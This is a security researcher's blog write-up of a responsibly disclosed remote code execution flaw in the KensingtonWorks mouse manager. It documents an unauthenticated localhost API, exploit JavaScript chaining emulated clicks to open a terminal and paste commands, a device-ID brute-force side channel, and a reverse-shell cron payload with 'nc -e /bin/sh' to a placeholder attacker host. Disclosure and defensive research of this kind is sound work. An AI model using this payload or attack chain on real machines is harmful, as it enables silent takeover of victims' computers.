---
layout: post
title: Remote code execution vulnerability in KensingtonWorks mouse manager
tags: [Bug bounty write-ups, Security]
og_image: https://robertheaton.com/images/kensington-cover.png
redirect_from:
  - /k
---
Back in February, a Twitter user who has asked to remain anonymous sent me a tipoff. They had noticed some odd behavior by [KensingtonWorks][kw], a piece of software that allows its users to add power functionality to mice made by Kensington, a popular brand of peripherals.

<img src="/images/kensington-twitter-dm.png" />

In their message they noted that KensingtonWorks was listening on a TCP network port, allowing other programs on the user's computer to connect to it. There's nothing necessarily wrong with this, but it was still a strange thing for KensingtonWorks to do. It shouldn't need to receive any network connections in order to manage its users' mice. I was intrigued. My dad owns several Kensington devices, and if you mess with my dad then, well, I'd prefer if you didn't. I started digging.

The result of said shovelwork was a vulnerability that allows an attacker to remotely execute arbitrary code on a victim's computer. I disclosed this flaw to Kensington on 2020-03-09, when I said that I would wait for 90 days before publishing details of the vulnerability to give them time to fix it. They have not been in contact with me since, but they appear to have recently mitigated the most harmful effects of the vulnerability, preventing it from being used to execute arbitrary code. However, they haven't patched the root cause, and an attacker can still use the same pattern to secretly mess with the user's KensingtonWorks settings. Users should either upgrade to v2.1.17 or uninstall the product until the remaining, less severe flaw is fixed, depending on their risk tolerance.

In this post I'll describe how the vulnerability works and how I found it.

## Vulnerability summary

To exploit the bug, the attacker lures their victim to a malicious website. The attacker's website uses JavaScript to send HTTP requests to an unsecured local web server run by KensingtonWorks. These requests trick KensingtonWorks into physically opening the users terminal application, then pasting and executing the attacker's payload commands. No user interaction with the page is required.

<img src="/images/kensington-poc.gif" />

## The backstory

Back to my DMs. My correspondent had messaged me in response to my request for [suspected privacy abuses][priv], but I reckoned that this was more likely to be a security problem than a privacy one. From a privacy perspective there's nothing intrinsically problematic about listening on a network port; but from a security point of view it increases the application's attack surface area and gives the developers more ways in which they can make mistakes.

I peered closer. The `127.0` at the edge of the screenshot in my correspondent's message suggested that KensingtonWorks was only listening on the local *loopback interface*.

<img src="/images/kensington-twitter-dm-ss.png" />

This at least meant that the application was only accessible to other programs running on the user's machine, and not to other machines on their network. Nonetheless, I couldn't think of a good reason for KensingtonWorks to open up even a local network port. As Sherlock Holmes might have said, once you eliminate all the good reasons for doing something, all that's left are the questionable ones. I decided to take a closer look.

I downloaded and installed KensingtonWorks. First I confirmed that it really was only listening on `lo0`, the loopback interface:

```
$ lsof -nP -iTCP | grep LISTEN | grep Kens
```

It was indeed, so next I wanted to see what information was being sent to its port. I opened up [Wireshark][wireshark], a tool that allows you to watch the network traffic flowing in and out of your computer. I set Wireshark listening on `lo0`, filtered to port `9090`.

Traffic appeared in Wireshark immediately. Something was pinging the KensingtonWorks server every few seconds with an HTTP `GET` request to a URL with the path `/devices`. The KensingtonWorks server was sending back the response `[]`. This was good news - since KensingtonWorks was using HTTP it would be straightforward to fiddle with.

However, the most important part of the HTTP request was the part that wasn't there - authentication.

<img src="/images/kensington-slash-devices.png" />

```
GET /devices HTTP/1.1
Accept: application/json, text/plain, */*
User-Agent: axios/0.19.0
Host: localhost:9090
Connection: close
```

Since there were no long, gibberish-looking tokens in the `/devices` request, it was pesos to pizza that the KensingtonWorks server was not protected by any kind of password or key. This meant that any program able to send HTTP requests to the server could perform the same actions as the official Kensington program that was sending those pings to `/devices`.

In particular, it occurred to me that if an attacker could trick a user into visiting a malicious website then that website could use JavaScript to send background HTTP requests to `http://localhost:9090`. The attacker wouldn't be able to read any data returned by the local KensingtonWorks server because browsers prevent pages from reading responses returned from other domains (unless the other domain is using [*Cross-Origin Resource Sharing* (CORS)][cors]). However, I figured that it was likely that some endpoints on the KensingtonWorks server were used to *update* configuration settings. An attacker could send requests to these endpoints with no problems. They still wouldn't get to see the responses, but this wouldn't matter because in this situation the requests are what do the damage.

This said, all I had so far was the `GET /devices` endpoint. This wasn't going to compromise any computers. I needed to find additional endpoints that would allow me to fiddle with the KensingtonWork's settings and cause some mischief. I clicked around the application and monitored Wireshark, trying to trigger more HTTP requests. But without any Kensington devices plugged the application was almost empty.

I assumed that if I bought myself a Kensington mouse then I'd be able to see more of the application's functionality. But Kensington mice aren't cheap, and £40 is a lot to pay for a boring, secure mouse. I wanted better evidence that there were vulnerabilities to be found before I purchased one. I decided to nose around at the code in KensingtonWorks's application directory:

```bash
$ cd /Applications/KensingtonWorks\ .app/
```

Since KensingtonWorks is a native OSX application I assumed that it was written in a compiled language like Objective C. This would mean that most of the contents of the directory would be unintelligible binary files, not legible sourcecode. However, it was still worth trying to find some of the keywords that I had turned up so far. I ran a command:

```bash
$ ag "/devices" --search-binary
Binary file Contents/Resources/app.asar matches.

Binary file Contents/Frameworks/Electron Framework.framework/Versions/A/Resources/resources.pak matches.

Binary file Contents/Helper/KensingtonWorksHelper.app/Contents/MacOS/KensingtonWorksHelper matches.

Binary file Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches.
```

Binary bingo. As well as turning up some promising leads, these search results confirmed a suspicion I had had. They showed that the KensingtonWorks code included a framework called Electron, which allows developers to write desktop applications using JavaScript. I suspected that the authors of KensingtonWorks decided, for speed and convenience, to structure their application like a website. The frontend was written in JavaScript (using Electron), and communicated with a backend web server, running on the user's local machine instead of a remote one. This local server was responsible for communicating with the mouse driver.

<img src="/images/kensington-map.png" />

In my opinion this makes some pragmatic sense, but leaving a web server lying around on the user's machine is too high a price to pay for a convenient development process. It increases the application's attack surface, opening it up to attacks like the one that will hit it in a few paragraphs' time.

Returning to my search results, the file that sounded most promising was the one at `[...]/MacOS/KensingtonWorksHelper`. I opened it. The file was mostly compiled nonsense, but I searched for the string `/devices` and found a long, interesting line (linebreaks inserted below for clarity):

```
^@success^@reason^@ response(failure):
^@HTTP/1.1 400 Bad Request^@device^@ap
p^@127.0.0.1^@GET^@^/favapps$^@^/devic
es$^@^/config/apps$^@DELETE^@^/devices
/([0-9]+)/emulatebuttonclick/([0-9]+)$ <--- INTERESTING
^@^/config$^@^/config/general$^@^/conf
ig/buttons$^@^/config/pointer$^@^/conf
ig/scroll$^@^/config/snippets^@command
 server stopped^@maybe_unlock_and_sign
 al_one^@event^@mutex^@kqueue^@pipe_se
 lect_interrupter^@kqueue interrupter 
 registration^@kqueue re-registration^
 @boost::asio::streambuf too long^@^M
 ```

This looked like a handy list of all the API endpoints in the KensingtonWorks server. The various `/config/...` endpoints sounded useful, but the one that caught my eye was `/devices/([0-9]+)/emulatebuttonclick/([0-9]+)` on the fifth line. Emulating a button click sounded like a great way to do something nasty to a victim's computer. I didn't know what to replace those `([0-9]+)` placeholders with, but suspected that if I bought myself a mouse then I would soon find out.

Before I shelled out £40 for a mouse I didn't actually want, I wanted to make one final check that the product met my high standards of insecurity. I tried probing the `/config/...` endpoints that I'd seen in the `[...]/MacOS/KensingtonWorksHelper` file (see above). I made some `GET` requests to my local KensingtonWorks server:

```bash
$ curl localhost:9090/config
{"devices":[],"platform":"darwin","timestamp":1582451041,"trayIcon":true,"versionMajor":2,"versionMinor":0}
$ curl localhost:9090/config/general
{"timeStamp":"2020-04-16T17-34-17.000Z","trayIcon":true}
```

I wondered if I could use the KensingtonWorks API to update the `trayIcon` parameter. Using standard REST conventions, I guessed a form for an update request:

```bash
# Double check the current config state
$ curl localhost:9090/config/general
{"timeStamp":"2020-04-16T17-34-17.000Z","trayIcon":true}

# Update the state
$ curl localhost:9090/config/general \
    -X POST -d "{\"trayIcon\": false}"
{"timeStamp":"2020-04-16T17-34-17.000Z","trayIcon":false}

# Confirm that the state has changed - trayIcon
# is now set to false.
$ curl localhost:9090/config/general
{"timeStamp":"2020-04-16T17-34-17.000Z","trayIcon":false}
```

Success - I had used the KensingtonWorks API to fiddle with a config setting, albeit a trivial one that didn't appear to do anything. The final proof of concept I wanted to construct before purchasing a mouse was to write a website that silently made this update in the background. I came up with the following JavaScript:

```javascript
fetch(
    "http://localhost:9090/config/general",
    {
        method : "POST",
        mode: "no-cors",
        body: JSON.stringify({"trayIcon": true})
    }
)
```

I put this code on a webpage. I visited the page, then checked the new state of my config:

```bash
$ curl localhost:9090/config/general
{"timeStamp":"2020-04-16T17-34-17.000Z","trayIcon":true}
```

My website had silently flipped the `trayIcon` setting from `false` back to `true`. I now had the code for a malicious website that could update a user's KensingtonWorks configuration. I was ready to investigate KensingtonWorks's other config settings, as well as the `emulatebuttonclick` endpoint I had seen in the code. But for this I would need an actual device. I purchased the cheapest Kensington mouse I could find, and even paid £5 for expedited shipping.

When the mouse arrived I plugged it in, hooked it up to KensingtonWorks, and started clicking around. With a device plugged in, a whole new UI opened up.

<img src="/images/kensington-ui.png" />

I set Wireshark listening on the loopback interface again and clicked on the buttons that allowed me to bind my mouse buttons to system shortcuts like copy, paste, and open applications. I bound my side mouse button to the "copy" command. I looked at the request that this sent to the server in Wireshark:

<img src="/images/kensington-config-button.png" />

```
POST /config/buttons?app=*&device=CENSORED&button=4 HTTP/1.1
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=utf-8
User-Agent: axios/0.19.0
Content-Length: 38
Host: localhost:9090
Connection: close

{"command":"editing_copy","params":{}}
```

Once again, the request contained no authentication. The closest thing to authentication looked to be the `device` parameter in the query string: a 5-digit number that presumably identified the target mouse in case the user had multiple Kensington devices. I manually re-sent this request from the command line with a different device ID:

```bash
$ curl localhost:9090/config/buttons?app=*&device=12345&button=4 -X POST -d "{\"command\":\"editing_copy\",\"params\":{}}"
{"reason":"Setting for device does not exist","success":false}
```

The request failed. This suggested that an attacker would need to know their victim's device ID in order to execute an attack. I didn't (and still don't) know how device IDs are generated. It could be a random ID set when the device is plugged in, or a fixed ID representing the model of the device, or something else entirely. I wasn't worried - even if the ID was randomly generated, an attacker could brute force the 100,000 5-digit combinations quite quickly.

I updated my attack website to use the `/config/buttons` endpoint to bind my side mouse button to the "screenshot" command. I opened my site in Chrome, and then re-opened KensingtonWorks. Success - my mouse's side button had been bound to "screenshot". I pressed it and took a screenshot for my log book.

This configuration caper was on its own already an exploit of sorts, but it was a bit of a boring one. In order to weaponize it I would need to understand the `emulatebuttonclick` endpoint. I hadn't been able to find any way of triggering it from the UI, and the only place I had seen it mentioned was in the compiled application code.

Fortunately, it wasn't hard to infer how the endpoint worked. In the KensingtonWorks code the endpoint was written as `/devices/([0-9]+)/emulatebuttonclick/([0-9]+)`. It seemed likely that the placeholders represented device and button IDs, like in the params of the `/config/buttons` endpoint. I guessed that the new endpoint was expecting a `POST` request rather than a `GET` one, because it sounded like it would cause something to happen, rather than simply retrieving information. I used KensingtonWorks to bind my side button to the "screenshot" command, and used `curl` to hit the `emulatebuttonclick` endpoint with the correct device and buttons IDs.

```bash
$ curl localhost:9090/devices/12345/emulatebuttonclick/4
```

I heard a satisfying click as this command caused my computer to take a screenshot.

Now all that remained was to string everything together in an exploit website. I wanted to use pairs of KensingtonWorks API requests to bind a sequence of commands to a mouse button and then emulate-click the button. I wanted to:

1. Use the "copy" command to copy a payload bash command from my attack website
1. Use the "open OSX terminal" command to open to OSX terminal
1. Use the "paste" command to paste and execute my payload bash command
1. Use the "quit" command to exit the terminal and clean up after myself

My payload bash command would be something like `crontab -l | { cat; echo "*/5 * * * * nc -e /bin/sh ATTACKER.IP.ADDR.ESS 1234"; } | crontab -`. This command creates a cron job that connects back to my machine every 5 minutes, giving me a persistent *reverse shell* that I can use to control the victim's machine. After establishing a connection I could sniff around on the target machine, try to escalate to root privileges, or simply add the machine to a botnet.

I wrote a library (not shown in this post so as to make a would-be attacker's life at least slightly challenging) that allowed me to write exploit JavaScript that looked like this:

```javascript
// NOTE: set the contents of #payload-command to the
// command you would like to execute.
var payload = document.getElementById('payload-command');
payload.focus();
payload.select();

function delay(t) {
  return new Promise(r => setTimeout(r, t))
}

commandRunner = new CommandRunner(deviceID: 12345)

commandRunner.copy().then(() =>
  delay(200)
).then(() =>
  commandRunner.openOSXTerminal()
).then(() =>
  delay(200)
).then(() =>
  commandRunner.paste()
).then(() =>
  delay(200)
).then(() =>
  commandRunner.quitApp()
)
```

I added my library and implementation code to my webpage and refreshed it. The copy/open/paste/quit sequence flashed past in less than a second. Here's a slowed down GIF:

<img src="/images/kensington-poc.gif" />

### How do we find the device ID?

Given a device ID, I could now execute arbitrary code on a victim's machine and compromise it. However, I still didn't know how device IDs were generated. Were they fixed and predictable, or would I need to brute-force them by trying every possible ID between 0 and 99,999 until one worked? I could have bought more Kensington mice to try to see if the device ID varied between different products or between different instances of the same product. But I was already out £40 for one mouse that I was never going to use, so I assumed the worst case (depending on your morals and point of view) approach of randomization and started putting together a way to brute force the device ID.

I'd need to keep trying requests with different device IDs until one of them worked. However, because of Cross-Origin Resource Sharing (CORS) restrictions, my JavaScript wouldn't get to see *anything* about the response sent by the KensingtonWorks server, not even whether it succeeded or failed. I'd need to work around these protections somehow.

My first thought was to use a timing attack. My JavaScript didn't get to see any of the KensingtonWorks response's contents, but it did get to see when the response arrived. I checked whether there was a difference in request duration between requests with valid and invalid IDs. There wasn't. However, I realized that I could use the same bind/emulatebuttonclick combination as before to report a request's outcome back to my script via a sneaky side-channel. To do this I wrote a script that:

1. Registered a JavaScript `onpaste` callback to trigger some code whenever the website saw that the user had invoked the "paste" command
1. Used KensingtonWorks to bind a mouse button to the "paste" command
1. Iterated through every device ID from 0 to 99,999, attempting to emulate a click of the bound "paste" button
1. After each attempted click, the script waited a few milliseconds to see if the `onpaste` callback had triggered. If it had, it used the most recently attempted device ID to execute the full attack described above. If not, it continued to the next device ID.

In my unscientific testing it was possible to try device IDs at a rate of over 20 per second. This would mean that a full scan from 0 to 99,999 would take under 2 hours. The mean time to success would be half the length of a full scan, or under 1 hour. The process could be sped up by not waiting the few milliseconds before checking whether the possible paste had completed. This would mean that my script could potentially report a slightly incorrect device ID, since the script could have sped paste the correct ID before the paste that it invoked had finished. To mitigate this, if my script detected a paste command, it could back up a few IDs and re-run the tests, only now pausing in between each attempt to ensure absolute accuracy.

<img src="/images/kensington-brute-force.png" />

An hour is admittedly a long time to require a victim to stay on a website, although it is also only a few pirated episodes of *The Office*. An attacker can store their progress in a cookie as they go, and complete a full device ID scan over the course of several user sessions. It's also entirely possible that the device ID is trivially predictable and none of this brute-forcing is necessary, but I'm not going to buy enough devices to find out for sure.

----

## Conclusion

To mitigate this vulnerability Kensington appear to have removed the `emulatebuttonclick` endpoint from KensingtonWorks. This means that an attacker can no longer use the above process to actually execute code. However, Kensington haven't updated KensingtonWorks's overall security model, so an attacker can still use the first half of the process to silently re-bind shortcut buttons and delete app-specific configurations. This bug should be fixed too, but it isn't a must-uninstall showstopper.

In my opinion KensingtonWorks should ditch the local web server model altogether. It's bad manners to leave an unnecessary local web server lying around, and it also increases the program's attack surface area. If making this change isn't an option, the developers should at least generate a random key when KensingtonWorks is installed and use it to verify that requests to the server are coming from the genuine KensingtonWorks client

Have a look to see what programs are listening on network ports on your own computer. For example, on OSX see what you find when you run:

```
$ lsof -nP -iTCP | grep LISTEN
```

If you see anything interesting then keep on digging, or at least [let me know what you've found](/about) and I'll see if I can help.

[wireshark]: https://www.wireshark.org/
[cors]: https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
[kw]: https://www.kensington.com/en-gb/software/kensingtonworks/
[priv]: https://robertheaton.com/2020/02/07/send-me-your-privacy-abuse-tipoffs/
